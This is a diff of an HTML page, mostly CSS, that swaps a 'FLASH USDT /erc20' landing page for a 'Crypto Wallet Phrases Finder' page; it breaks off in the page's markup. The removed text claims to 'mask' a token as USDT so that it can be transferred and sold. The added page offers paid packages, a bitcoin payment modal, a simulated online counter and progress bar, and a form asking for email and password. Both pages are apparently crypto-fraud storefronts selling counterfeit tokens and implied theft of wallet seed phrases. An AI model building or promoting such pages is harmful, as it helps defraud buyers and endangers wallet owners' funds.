@@ -3,909 +3,1129 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>FLASH USDT /erc20: Revolutionize Your Buying Power of Crypto</title>
+<title>Crypto Wallet Phrases Finder</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
 <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Roboto:wght@300;400;700&family=Audiowide&display=swap');
+  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&family=Orbitron:wght@400;700&display=swap');
 
-    :root {
-        --primary-color: #00F0FF;
-        --secondary-color: #1A1A2E;
-        --accent-color: #FF00A8;
-        --bg-color: #0F0F1A;
-        --text-color: #E0E0E0;
-    }
+  :root {
+    --primary-color: #00ffff;
+    --secondary-color: #ff00ff;
+    --background-color: #0f0f1f;
+    --text-color: #e0e0e0;
+  }
 
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-    }
+  body {
+    font-family: 'Roboto', sans-serif;
+    background: var(--background-color);
+    color: var(--text-color);
+    margin: 0;
+    padding: 0;
+    overflow-x: hidden;
+    position: relative;
+  }
 
-    body {
-        font-family: 'Roboto', sans-serif;
-        background-color: var(--bg-color);
-        color: var(--text-color);
-        line-height: 1.6;
-        overflow-x: hidden;
-    }
+  body::before {
+    content: "";
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(45deg, rgba(0, 255, 255, 0.1), rgba(255, 0, 255, 0.1));
+    z-index: -1;
+    animation: gradientBG 15s ease infinite;
+    background-size: 400% 400%;
+  }
 
+  @keyframes gradientBG {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+
+  @keyframes float {
+    0% { transform: translateY(0px); }
+    50% { transform: translateY(-10px); }
+    100% { transform: translateY(0px); }
+  }
+
+  @keyframes pulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.05); }
+    100% { transform: scale(1); }
+  }
+
+  @keyframes shimmer {
+    0% { background-position: -1000px 0; }
+    100% { background-position: 1000px 0; }
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  header {
+    background: linear-gradient(45deg, #1a1a2e, #16213e);
+    padding: 20px 0;
+    position: relative;
+    overflow: hidden;
+  }
+  .header-content {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+  }
+  h1, h2, h3 {
+    font-family: 'Orbitron', sans-serif;
+    animation: float 3s ease-in-out infinite;
+  }
+  h1 {
+    font-size: 2.5em;
+    margin-bottom: 10px;
+    color: var(--primary-color);
+    text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+  }
+  .online-counter {
+    font-size: 1.2em;
+    color: var(--primary-color);
+    background: linear-gradient(45deg, rgba(0, 255, 255, 0.1), rgba(255, 0, 255, 0.1));
+    border-radius: 20px;
+    padding: 10px 20px;
+    display: inline-block;
+    box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
+    animation: pulse 2s infinite, float 3s ease-in-out infinite;
+  }
+
+  .online-counter span {
+    font-weight: bold;
+    font-family: 'Orbitron', sans-serif;
+  }
+
+  @keyframes pulse {
+    0% { box-shadow: 0 0 15px rgba(0, 255, 255, 0.3); }
+    50% { box-shadow: 0 0 25px rgba(0, 255, 255, 0.5); }
+    100% { box-shadow: 0 0 15px rgba(0, 255, 255, 0.3); }
+  }
+
+  @keyframes float {
+    0% { transform: translateY(0px); }
+    50% { transform: translateY(-5px); }
+    100% { transform: translateY(0px); }
+  }
+
+  .crypto-particles {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+  }
+  .explanation {
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 15px;
+    padding: 30px;
+    margin-bottom: 40px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+  }
+  .explanation h2 {
+    color: var(--primary-color);
+    margin-bottom: 20px;
+  }
+  .explanation-content {
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+    text-align: center;
+  }
+  .explanation-features {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 20px;
+  }
+  .feature-box {
+    flex: 1 1 200px;
+    max-width: 250px;
+    background: linear-gradient(135deg, #2a2a4a, #3a3a6a);
+    border-radius: 15px;
+    padding: 20px;
+    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+    text-align: center;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    opacity: 0;
+    transform: translateY(20px);
+    transition: opacity 0.5s ease, transform 0.5s ease;
+  }
+  .feature-box:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 20px rgba(0, 255, 255, 0.2);
+  }
+  .feature-box i {
+    font-size: 48px;
+    color: var(--primary-color);
+    margin-bottom: 15px;
+  }
+  .feature-box p {
+    font-size: 0.9em;
+    line-height: 1.4;
+  }
+  .packages {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 20px;
+  }
+  .package {
+    flex: 0 1 300px;
+    max-width: 300px;
+    background: linear-gradient(135deg, #2a2a4a, #3a3a6a);
+    border-radius: 15px;
+    padding: 30px;
+    box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    opacity: 0;
+    transform: translateY(20px);
+    transition: opacity 0.5s ease, transform 0.5s ease;
+  }
+  .package:hover {
+    transform: translateY(-10px);
+    box-shadow: 0 20px 40px rgba(0, 255, 255, 0.3);
+  }
+  .package-header {
+    text-align: center;
+    margin-bottom: 20px;
+  }
+  .package h3 {
+    color: var(--primary-color);
+    font-size: 1.8em;
+    margin-bottom: 10px;
+  }
+  .price {
+    font-size: 2em;
+    font-weight: bold;
+    background: linear-gradient(90deg, var(--secondary-color), var(--primary-color), var(--secondary-color));
+    background-size: 1000px 100%;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: shimmer 5s infinite linear;
+  }
+  .package-features {
+    list-style-type: none;
+    padding: 0;
+    margin-bottom: 20px;
+  }
+  .package-features li {
+    margin-bottom: 10px;
+    padding-left: 20px;
+    position: relative;
+  }
+  .package-features li::before {
+    content: '✓';
+    color: var(--primary-color);
+    position: absolute;
+    left: 0;
+  }
+  .purchase-btn, .phrases-finder-btn {
+    width: 100%;
+    padding: 15px;
+    font-size: 1.1em;
+    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+    color: #1a1a2e;
+    border: none;
+    border-radius: 25px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: all 0.3s ease;
+    display: block;
+    margin: 20px auto;
+    max-width: 300px;
+  }
+  .purchase-btn:hover, .phrases-finder-btn:hover, .centered-purchase-btn:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 20px rgba(0, 255, 255, 0.3);
+  }
+  .phrases-finder-btn {
+    width: 100%;
+    max-width: 400px;
+    padding: 20px;
+    font-size: 1.3em;
+    background: linear-gradient(45deg, #ff00ff, #00ffff);
+    color: #000;
+    border: none;
+    border-radius: 50px;
+    cursor: pointer;
+    font-weight: bold;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    transition: all 0.3s ease;
+    box-shadow: 0 10px 20px rgba(255, 255, 255, 0.3);
+    margin: 40px auto;
+    display: block;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .phrases-finder-btn::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: rgba(255, 255, 255, 0.1);
+    transform: rotate(45deg);
+    z-index: 1;
+    transition: all 0.3s ease;
+  }
+
+  .phrases-finder-btn:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 15px 30px rgba(255, 0, 255, 0.4);
+  }
+
+  .phrases-finder-btn:hover::before {
+    left: 100%;
+  }
+
+  .phrases-finder-btn span {
+    position: relative;
+    z-index: 2;
+  }
+
+  .timer {
+    font-size: 2.5em;
+    font-weight: bold;
+    text-align: center;
+    margin-bottom: 20px;
+    color: var(--primary-color);
+  }
+  .container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 20px;
+    text-align: center;
+  }
+  .centered-purchase-btn {
+    display: block;
+    width: 80%;
+    max-width: 300px;
+    margin: 40px auto;
+    padding: 15px;
+    font-size: 1.2em;
+    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+    color: #1a1a2e;
+    border: none;
+    border-radius: 25px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: all 0.3s ease;
+  }
+  .centered-purchase-btn:hover {
+    background: linear-gradient(45deg, var(--secondary-color), var(--primary-color));
+    box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
+  }
+  @media (max-width: 768px) {
     .container {
-        max-width: 1200px;
-        margin: 0 auto;
-        padding: 0 20px;
+      padding: 10px;
     }
 
     header {
-        background-color: rgba(26, 26, 46, 0.8);
-        backdrop-filter: blur(10px);
-        position: fixed;
-        width: 100%;
-        top: 0;
-        z-index: 1000;
-    }
-
-    nav {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        padding: 20px 0;
-    }
-
-    .logo {
-        font-family: 'Audiowide', cursive;
-        font-size: 28px;
-        font-weight: 700;
-        color: var(--primary-color);
-        text-shadow: 0 0 10px rgba(0, 240, 255, 0.5);
-        letter-spacing: 2px;
-    }
-
-    .nav-links {
-        display: flex;
-        gap: 30px;
-    }
-
-    .nav-links a {
-        text-decoration: none;
-        color: var(--text-color);
-        font-weight: 500;
-        transition: color 0.3s ease;
-    }
-
-    .nav-links a:hover {
-        color: var(--primary-color);
-    }
-
-    .hero {
-        min-height: 100vh;
-        display: flex;
-        align-items: center;
-        position: relative;
-        overflow: hidden;
-        padding-top: 100px;
-    }
-
-    .hero-content {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        flex-wrap: wrap;
-    }
-
-    .hero-text {
-        flex: 1;
-        min-width: 300px;
-        z-index: 2;
+      padding: 20px 0;
     }
 
     h1 {
-        font-family: 'Orbitron', sans-serif;
-        font-size: 42px;
-        margin-bottom: 30px;
-        color: var(--primary-color);
-        text-shadow: 0 0 20px rgba(0, 240, 255, 0.5);
-        line-height: 1.2;
+      font-size: 2em;
     }
 
-    .subtitle {
-        font-size: 24px;
-        color: var(--accent-color);
-        margin-bottom: 20px;
-        font-weight: 600;
-        text-shadow: 0 0 10px rgba(255, 0, 168, 0.5);
+    .packages {
+      flex-direction: column;
+      align-items: center;
     }
 
-    .hero-text p {
-        font-size: 18px;
-        margin-bottom: 30px;
+    .package {
+      width: 100%;
+      max-width: 300px;
     }
 
-    .cta-button {
-        display: inline-block;
-        background-color: var(--accent-color);
-        color: #fff;
-        padding: 12px 30px;
-        border-radius: 30px;
-        text-decoration: none;
-        font-weight: 600;
-        transition: all 0.3s ease;
-        box-shadow: 0 0 20px rgba(255, 0, 168, 0.5);
+    .explanation-features {
+      flex-direction: column;
+      align-items: center;
     }
 
-    .cta-button:hover {
-        transform: translateY(-3px);
-        box-shadow: 0 0 30px rgba(255, 0, 168, 0.8);
+    .reviews {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
     }
 
-    .hero-image {
-        flex: 1;
-        min-width: 300px;
-        text-align: right;
-        z-index: 2;
+    .review {
+      max-width: 600px;
+      margin-bottom: 20px;
+    }
+  }
+
+  nav {
+    background: rgba(255, 255, 255, 0.1);
+    padding: 10px;
+  }
+
+  nav ul {
+    display: flex;
+    justify-content: center;
+    list-style-type: none;
+    padding: 0;
+  }
+
+  nav a {
+    color: var(--text-color);
+    text-decoration: none;
+    font-weight: bold;
+  }
+
+  #menu-toggle {
+    display: none;
+  }
+
+  @media (max-width: 768px) {
+    #menu-toggle {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      background: var(--primary-color);
+      color: var(--background-color);
+      border: none;
+      cursor: pointer;
     }
 
-    .hero-image svg {
-        max-width: 100%;
-        height: auto;
+    nav ul {
+      display: none;
+      flex-direction: column;
+      align-items: center;
     }
 
-    .features {
-        padding: 100px 0;
-        background-color: rgba(26, 26, 46, 0.8);
+    nav ul.show {
+      display: flex;
     }
 
-    .features h2 {
-        text-align: center;
-        font-family: 'Orbitron', sans-serif;
-        font-size: 36px;
-        margin-bottom: 50px;
-        color: var(--primary-color);
+    nav li {
+      margin: 10px 0;
     }
+  }
 
-    .feature-grid {
-        display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-        gap: 30px;
+  .modal {
+    display: none;
+    position: fixed;
+    z-index: 1000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    overflow: auto;
+    background-color: rgba(0,0,0,0.4);
+    animation: fadeIn 0.3s;
+  }
+
+  .modal-content {
+    background-color: #2a2a4a;
+    margin: 15% auto;
+    padding: 20px;
+    border: 1px solid #888;
+    width: 80%;
+    max-width: 500px;
+    border-radius: 15px;
+    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    animation: slideIn 0.3s;
+  }
+
+  @keyframes fadeIn {
+    from {opacity: 0;}
+    to {opacity: 1;}
+  }
+
+  @keyframes slideIn {
+    from {transform: translateY(-50px); opacity: 0;}
+    to {transform: translateY(0); opacity: 1;}
+  }
+
+  .close {
+    color: #aaa;
+    float: right;
+    font-size: 28px;
+    font-weight: bold;
+    cursor: pointer;
+  }
+
+  .close:hover,
+  .close:focus {
+    color: #fff;
+    text-decoration: none;
+    cursor: pointer;
+  }
+
+  .progress-bar {
+    width: 100%;
+    background-color: #ddd;
+    border-radius: 5px;
+    margin-bottom: 20px;
+  }
+
+  .progress {
+    width: 0;
+    height: 20px;
+    background-color: var(--primary-color);
+    border-radius: 5px;
+    transition: width 0.5s;
+  }
+
+  .payment-info {
+    margin-bottom: 20px;
+  }
+
+  .bitcoin-address {
+    background-color: rgba(255,255,255,0.1);
+    padding: 10px;
+    border-radius: 5px;
+    margin-bottom: 10px;
+    word-break: break-all;
+  }
+
+  .copy-btn, .close-btn {
+    background-color: var(--primary-color);
+    color: #000;
+    border: none;
+    padding: 10px 20px;
+    margin: 5px;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+  }
+
+  .copy-btn:hover, .close-btn:hover {
+    background-color: var(--secondary-color);
+  }
+
+  .transfer-status {
+    margin-top: 20px;
+  }
+
+  .dots {
+    display: inline-block;
+    width: 30px;
+  }
+
+  @keyframes blink {
+    0% { opacity: .2; }
+    20% { opacity: 1; }
+    100% { opacity: .2; }
+  }
+
+  .dots span {
+    animation-name: blink;
+    animation-duration: 1.4s;
+    animation-iteration-count: infinite;
+    animation-fill-mode: both;
+  }
+
+  .dots span:nth-child(2) {
+    animation-delay: .2s;
+  }
+
+  .dots span:nth-child(3) {
+    animation-delay: .4s;
+  }
+
+  /* Smooth scroll effect */
+  html {
+    scroll-behavior: smooth;
+  }
+
+  /* Animate progress bar in modal */
+  @keyframes progressAnimation {
+    0% { width: 0%; }
+    100% { width: 100%; }
+  }
+
+  .progress {
+    animation: progressAnimation 600s linear;
+  }
+
+  @keyframes float {
+    0% { transform: translateY(0px); }
+    50% { transform: translateY(-10px); }
+    100% { transform: translateY(0px); }
+  }
+
+  .crypto-icon {
+    position: absolute;
+    font-size: 24px;
+    opacity: 0.5;
+    animation: float 3s ease-in-out infinite;
+  }
+
+  .btc::after { content: '₿'; color: #f7931a; }
+  .eth::after { content: 'Ξ'; color: #62688f; }
+  .ltc::after { content: 'Ł'; color: #345d9d; }
+  .xrp::after { content: '✕'; color: #00aae4; }
+
+  .reviews {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: space-around;
+    margin-top: 40px;
+  }
+
+  .review {
+    flex: 0 1 calc(50% - 20px);
+    display: flex;
+    align-items: center;
+    background: rgba(255, 255, 255, 0.1);
+    border-radius: 15px;
+    padding: 20px;
+    margin-bottom: 20px;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+  }
+
+  .review:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 20px rgba(0, 255, 255, 0.2);
+  }
+
+  .review img {
+    width: 120px;
+    height: 120px;
+    border-radius: 50%;
+    margin-right: 20px;
+    border: 3px solid var(--primary-color);
+  }
+
+  .review-content {
+    flex: 1;
+  }
+
+  .review h3 {
+    color: var(--primary-color);
+    margin-bottom: 10px;
+  }
+
+  .review p {
+    font-style: italic;
+  }
+
+  @media (max-width: 768px) {
+    .review {
+      flex: 0 1 100%;
     }
+  }
 
-    .feature-item {
-        text-align: center;
-        padding: 30px;
-        border-radius: 10px;
-        background: linear-gradient(145deg, #1a1a2e, #0f0f1a);
-        box-shadow: 0 8px 32px 0 rgba(0, 240, 255, 0.1);
-        transition: transform 0.3s ease;
+  .whatsapp-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    background-color: #25d366;
+    color: white;
+    border-radius: 50%;
+    width: 60px;
+    height: 60px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 30px;
+    text-decoration: none;
+    box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+    transition: all 0.3s ease;
+    animation: pulse 2s infinite;
+    z-index: 1000;
+  }
+
+  .whatsapp-btn:hover {
+    transform: scale(1.1);
+    box-shadow: 0 6px 12px rgba(0,0,0,0.4);
+  }
+
+  @keyframes pulse {
+    0% {
+      box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.5);
     }
-
-    .feature-item:hover {
-        transform: translateY(-10px);
+    70% {
+      box-shadow: 0 0 0 10px rgba(37, 211, 102, 0);
     }
-
-    .feature-icon {
-        font-size: 48px;
-        color: var(--primary-color);
-        margin-bottom: 20px;
+    100% {
+      box-shadow: 0 0 0 0 rgba(37, 211, 102, 0);
     }
+  }
 
-    .feature-item h3 {
-        font-family: 'Orbitron', sans-serif;
-        font-size: 24px;
-        margin-bottom: 15px;
-        color: var(--primary-color);
-    }
+  .email-btn {
+    position: fixed;
+    bottom: 90px; /* Position above the WhatsApp button */
+    right: 20px;
+    background-color: #0078FF; /* A blue color for email */
+    color: white;
+    border-radius: 50%;
+    width: 60px;
+    height: 60px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 30px;
+    text-decoration: none;
+    box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+    transition: all 0.3s ease;
+    animation: pulse 2s infinite;
+    z-index: 1000;
+  }
 
-    .stats {
-        background-color: var(--secondary-color);
-        color: var(--text-color);
-        padding: 50px 0;
-    }
+  .email-btn:hover {
+    transform: scale(1.1);
+    box-shadow: 0 6px 12px rgba(0,0,0,0.4);
+  }
 
-    .stats-container {
-        display: flex;
-        justify-content: space-around;
-        flex-wrap: wrap;
-        text-align: center;
-    }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
 
-    .stat-item {
-        margin: 20px;
-    }
+  .signup-section {
+    position: absolute;
+    top: 20px;
+    right: 20px;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    z-index: 10;
+    background: rgba(10, 10, 10, 0.7);
+    padding: 15px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 255, 255, 0.2);
+  }
 
-    .stat-item h4 {
-        font-family: 'Orbitron', sans-serif;
-        font-size: 36px;
-        margin-bottom: 10px;
-        color: var(--primary-color);
-    }
+  .signup-section input {
+    padding: 8px;
+    border: none;
+    border-radius: 5px;
+    background: rgba(255, 255, 255, 0.1);
+    color: var(--text-color);
+    font-family: 'Roboto', sans-serif;
+    width: 200px;
+  }
 
-    .crypto {
-        padding: 100px 0;
-        background-color: var(--bg-color);
-    }
+  .signup-section button {
+    padding: 8px 15px;
+    border: none;
+    border-radius: 5px;
+    background: var(--secondary-color);
+    color: var(--background-color);
+    font-family: 'Roboto', sans-serif;
+    cursor: pointer;
+    transition: all 0.3s ease;
+  }
 
-    .crypto h2 {
-        text-align: center;
-        font-family: 'Orbitron', sans-serif;
-        font-size: 36px;
-        margin-bottom: 50px;
-        color: var(--primary-color);
-    }
+  .signup-section button:hover {
+    background: var(--primary-color);
+  }
 
-    .crypto-container {
-        position: relative;
-        max-width: 100%;
-        overflow-x: auto;
-    }
+  .popup {
+    display: none;
+    position: fixed;
+    z-index: 1000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    overflow: auto;
+    background-color: rgba(0,0,0,0.6);
+    animation: fadeIn 0.3s;
+    text-align: center;
+    padding-top: 20%;
+    color: white;
+  }
 
-    .crypto-header {
-        position: absolute;
-        top: 0;
-        right: 0;
-        z-index: 1;
-    }
-
-    .crypto-table-wrapper {
-        max-height: 300px;
-        overflow-y: auto;
-        border: 1px solid var(--primary-color);
-        border-radius: 10px;
-    }
-
-    #crypto-table {
-        width: 100%;
-        border-collapse: collapse;
-    }
-
-    #crypto-table th, #crypto-table td {
-        padding: 10px;
-        text-align: left;
-        border-bottom: 1px solid var(--primary-color);
-    }
-
-    #crypto-table th {
-        position: sticky;
-        top: 0;
-        background-color: var(--bg-color);
-        z-index: 1;
-    }
-
-    .trade-btn {
-        background-color: var(--accent-color);
-        color: #fff;
-        border: none;
-        padding: 8px 16px;
-        border-radius: 5px;
-        cursor: pointer;
-        transition: all 0.3s ease;
-    }
-
-    .trade-btn:hover {
-        transform: translateY(-3px);
-        box-shadow: 0 0 15px rgba(255, 0, 168, 0.5);
-    }
-
-    .crypto-symbol {
-        width: 24px;
-        height: 24px;
-        margin-right: 10px;
-        vertical-align: middle;
-    }
-
-    .price-up {
-        color: #00ff00;
-    }
-
-    .price-down {
-        color: #ff0000;
-    }
-
-    .whatsapp-button {
-        position: fixed;
-        bottom: 20px;
-        right: 20px;
-        z-index: 1000;
-        background-color: #25D366;
-        color: white;
-        border-radius: 50%;
-        width: 60px;
-        height: 60px;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
-        transition: all 0.3s ease;
-    }
-
-    .whatsapp-button:hover {
-        transform: scale(1.1);
-        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
-    }
-
-    @keyframes popupAnimation {
-        0% { transform: scale(1); }
-        50% { transform: scale(1.1); }
-        100% { transform: scale(1); }
-    }
-
-    .message-box {
-        animation: popupAnimation 2s infinite;
-        transform-origin: center;
-    }
-
-    .message-text {
-        animation: popupAnimation 2s infinite;
-        transform-origin: center;
-    }
-
-    .left-message {
-        animation-delay: 0.5s;
-    }
-
-    .right-message {
-        animation-delay: 1s;
-    }
-
-    .loading-overlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0.8);
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        z-index: 9999;
-    }
-
-    .loading-spinner {
-        border: 5px solid #f3f3f3;
-        border-top: 5px solid var(--primary-color);
-        border-radius: 50%;
-        width: 50px;
-        height: 50px;
-        animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
-
-    .licenses {
-        padding: 100px 0;
-        background-color: var(--bg-color);
-    }
-
-    .license-grid {
-        display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-        gap: 30px;
-    }
-
-    .license-item {
-        text-align: center;
-        padding: 30px;
-        border-radius: 10px;
-        background: linear-gradient(145deg, #1a1a2e, #0f0f1a);
-        box-shadow: 0 8px 32px 0 rgba(0, 240, 255, 0.1);
-    }
-
-    .purchase-btn {
-        margin-top: 20px;
-        padding: 10px 20px;
-        background-color: var(--accent-color);
-        color: #fff;
-        border: none;
-        border-radius: 5px;
-        cursor: pointer;
-        transition: all 0.3s ease;
-    }
-
-    .purchase-btn:hover {
-        transform: translateY(-3px);
-        box-shadow: 0 0 15px rgba(255, 0, 168, 0.5);
-    }
-
-    .license-popup {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0.8);
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        z-index: 9999;
-    }
-
-    .popup-content {
-        background-color: var(--bg-color);
-        padding: 30px;
-        border-radius: 10px;
-        text-align: center;
-    }
-
-    .bitcoin-info {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin-top: 20px;
-    }
-
-    .bitcoin-icon {
-        width: 24px;
-        height: 24px;
-        margin-right: 10px;
-    }
-
-    .copy-btn, .close-btn {
-        margin-top: 10px;
-        padding: 5px 10px;
-        background-color: var(--primary-color);
-        color: #fff;
-        border: none;
-        border-radius: 5px;
-        cursor: pointer;
-    }
-
-    .crypto-container {
-        display: flex;
-        align-items: flex-start;
-    }
-
-    .trade-btn {
-        background-color: var(--accent-color);
-        color: #fff;
-        border: none;
-        padding: 10px 20px;
-        border-radius: 5px;
-        cursor: pointer;
-        margin-right: 20px;
-        transition: all 0.3s ease;
-    }
-
-    .trade-btn:hover {
-        transform: translateY(-3px);
-        box-shadow: 0 0 15px rgba(255, 0, 168, 0.5);
-    }
-
-    .trade-popup {
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background-color: var(--bg-color);
-        padding: 20px;
-        border-radius: 10px;
-        box-shadow: 0 0 20px rgba(0, 240, 255, 0.5);
-        z-index: 1000;
-        display: none;
-    }
-
-    .trade-popup.show {
-        display: block;
-        animation: popupAnimation 0.5s ease;
-    }
-
-    .floating-crypto-symbols {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        pointer-events: none;
-        z-index: 9998;
-    }
-
-    .floating-symbol {
-        position: absolute;
-        font-size: 24px;
-        opacity: 0.5;
-        animation: floatSymbol 10s linear infinite;
-    }
-
-    @keyframes floatSymbol {
-        0% { transform: translateY(100vh) rotate(0deg); }
-        100% { transform: translateY(-100px) rotate(360deg); }
-    }
-
-    @media (max-width: 768px) {
-        .hero-content {
-            flex-direction: column;
-            text-align: center;
-        }
-
-        .hero-text, .hero-image {
-            flex: none;
-            width: 100%;
-        }
-
-        .hero-image {
-            margin-top: 30px;
-        }
-
-        .nav-links {
-            display: none;
-        }
-
-        .hero {
-            padding-top: 120px;
-        }
-
-        h1 {
-            font-size: 36px;
-        }
-
-        .crypto-container {
-            padding-top: 40px;
-        }
-
-        .crypto-header {
-            position: relative;
-            text-align: right;
-            margin-bottom: 10px;
-        }
-
-        .crypto-table-wrapper {
-            max-height: 250px;
-        }
-
-        #crypto-table th, #crypto-table td {
-            padding: 8px;
-            font-size: 14px;
-        }
-    }
+  @keyframes fadeIn {
+    from {opacity: 0;}
+    to {opacity: 1;}
+  }
+  
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
 </style>
 </head>
 <body>
-    <header>
-        <nav class="container">
-            <div class="logo">FLASH USDT /erc20</div>
-            <div class="nav-links">
-                <a href="#features">Features</a>
-                <a href="#stats">Stats</a>
-                <a href="#crypto">Crypto</a>
-            </div>
-        </nav>
-    </header>
+  <header>
+    <div class="header-content">
+      <h1>Crypto Wallet Phrases Finder</h1>
+      <div class="online-counter">
+        ONLINE NOW: <span id="online-count">0</span>
+      </div>
+    </div>
+    <div class="crypto-particles" id="crypto-particles"></div>
+  </header>
 
-    <section class="hero">
-        <div class="dropshipping-symbols"></div>
-        <div class="container hero-content">
-            <div class="hero-text">
-                <h1>Revolutionize Your Buying Power of Crypto with FLASH USDT /erc20</h1>
-                <p class="subtitle">Buy Your License Now</p>
-                <p>Our Flash USDT is a unique solution, utilizing validator nodes on the ERC20 network to Mask a token with the same contract as USDT. This enables it to function like USDT, being transferable, swappable, bridgeable, p2p sellable, etc</p>
-                <a href="https://walletcryp.com" class="cta-button" id="access-license-btn">ACCESS NOW WITH YOUR LICENSE</a>
-            </div>
-            <div class="hero-image">
-                <svg width="500" height="500" viewBox="0 0 500 500" xmlns="http://www.w3.org/2000/svg">
-                    <!-- Phone 1 - Dropshipping Platform -->
-                    <rect x="50" y="50" width="180" height="350" rx="20" fill="#1A1A2E" />
-                    <rect x="60" y="70" width="160" height="300" rx="10" fill="#00F0FF" />
-                    <rect x="70" y="90" width="140" height="260" fill="#0F0F1A" />
-                    <path d="M110 180 L170 180 L170 240 L110 240 Z" fill="#FF00A8" />
-                    <path d="M110 180 L140 160 L170 180" fill="#FF00A8" />
-                    <path d="M140 180 L140 240" stroke="#FFFFFF" stroke-width="2" />
-                    <path d="M110 210 L170 210" stroke="#FFFFFF" stroke-width="2" />
-                    <circle cx="140" cy="225" r="8" fill="#00F0FF" />
-                    <!-- New USDT ERC20 symbol -->
-                    <rect x="65" y="280" width="150" height="60" rx="5" fill="#FFFFFF" class="message-box left-message" />
-                    <text x="140" y="315" font-family="Arial" font-size="24" fill="#26A17B" text-anchor="middle" class="message-text left-message">
-                        USDT
-                    </text>
-                    <text x="140" y="330" font-family="Arial" font-size="12" fill="#26A17B" text-anchor="middle" class="message-text left-message">
-                        ERC20
-                    </text>
+  <div id="signupSection" class="signup-section">
+      <input type="email" id="signupEmail" placeholder="Email Address" required>
+      <input type="password" id="signupPassword" placeholder="Password" required>
+      <button id="signupButton">Sign Up</button>
+  </div>
 
-                    <!-- Phone 2 - Trading Platform -->
-                    <rect x="270" y="100" width="180" height="350" rx="20" fill="#1A1A2E" />
-                    <rect x="280" y="120" width="160" height="300" rx="10" fill="#00F0FF" />
-                    <rect x="290" y="140" width="140" height="260" fill="#0F0F1A" />
-                    <!-- Stocks list -->
-                    <text x="300" y="160" font-family="Arial" font-size="12" fill="#FFFFFF">AAPL $150.25 +2.3%</text>
